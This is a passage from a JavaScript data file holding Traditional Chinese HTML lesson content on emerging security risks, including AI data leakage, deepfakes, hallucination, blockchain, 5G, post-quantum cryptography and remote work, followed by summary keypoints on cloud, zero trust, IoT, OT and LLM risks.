<tr><td><b>敏感資料外洩</b></td><td>員工把機密資料、個資貼到外部 AI 服務</td></tr>
<tr><td><b>深偽 Deepfake</b></td><td>以 AI 偽造聲音或影像，用於詐騙（假冒主管視訊要求匯款）</td></tr>
<tr><td><b>幻覺 Hallucination</b></td><td>模型產生看似合理但錯誤的內容</td></tr>
</table></div>
<p>參考資源：<b>OWASP Top 10 for LLM Applications</b>、NIST AI RMF（AI 風險管理框架）、ISO/IEC 42001（AI 管理系統）、歐盟 AI 法（AI Act）。</p>
<div class="box tip"><b class="t">AI 協助防禦</b>AI 也被用於異常偵測、自動化告警分析、惡意程式分類、釣魚信辨識。組織應訂定<b>AI 使用政策</b>：哪些資料不可輸入、哪些工具經核准、輸出需人工覆核。</div>
<h3>其他新興議題</h3>
<ul>
  <li><b>區塊鏈</b>：分散式帳本，具防竄改特性；風險在於智慧合約漏洞、私鑰管理、51% 攻擊。</li>
  <li><b>5G</b>：網路切片、邊緣運算帶來新攻擊面。</li>
  <li><b>後量子密碼</b>：預防「先蒐集、後解密（Harvest Now, Decrypt Later）」攻擊。</li>
  <li><b>遠距辦公</b>：家用網路與個人裝置風險，需 VPN/ZTNA、MDM、MFA。</li>
</ul>` }
  ],
  keypoints: [
    'IaaS → PaaS → SaaS：客戶責任遞減；資料與帳號永遠是客戶責任',
    '雲端事故最常見原因：客戶設定錯誤；CASB 管控影子 IT',
    '零信任：永不信任、一律驗證、假設已遭入侵、微分段',
    'IoT 首要：變更預設密碼、網路隔離（Mirai 教訓）',
    'OT 以可用性與人身安全優先；Stuxnet 攻擊 PLC',
    'LLM 風險：提示注入、資料投毒、敏感資料外洩、深偽詐騙'
  ]
}
);
